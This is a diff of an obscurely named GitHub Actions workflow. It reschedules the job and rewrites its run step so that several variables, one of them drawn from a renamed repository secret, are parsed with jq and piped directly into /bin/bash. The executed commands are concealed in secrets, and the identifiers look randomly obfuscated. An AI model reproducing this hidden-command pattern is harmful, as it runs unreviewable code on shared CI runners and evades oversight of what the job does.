@@ -1,19 +1,25 @@
 name: wrackricotta
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 2/6 * * *'
+    - cron: '49 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wrackricotta
         env:
-          d43987: ${{ secrets.d43987 }}
+          cbp9: ${{ secrets.cbp9 }}
         run: |
-          echo $d43987 | jq -r .aiska525 | /bin/bash
-          echo $csb0 | jq -r .zsvvi242 | /bin/bash
-          echo $m03 | jq -r .abxcj97696 | /bin/bash
+          echo $cbp9 | jq -r .u64 | /bin/bash
+          echo $p680 | jq -r .rbzo03 | /bin/bash
+          echo $wcgt91 | jq -r .qic22859 | /bin/bash
+          echo $ftl50080 | jq -r .b0 | /bin/bash
+          echo $juvp4965 | jq -r .hmgdr33266 | /bin/bash
+          echo $qs13 | jq -r .b3242 | /bin/bash
+          echo $fqn42132 | jq -r .hwaw0 | /bin/bash
+          echo $xrvz6 | jq -r .ffmvj0 | /bin/bash
 
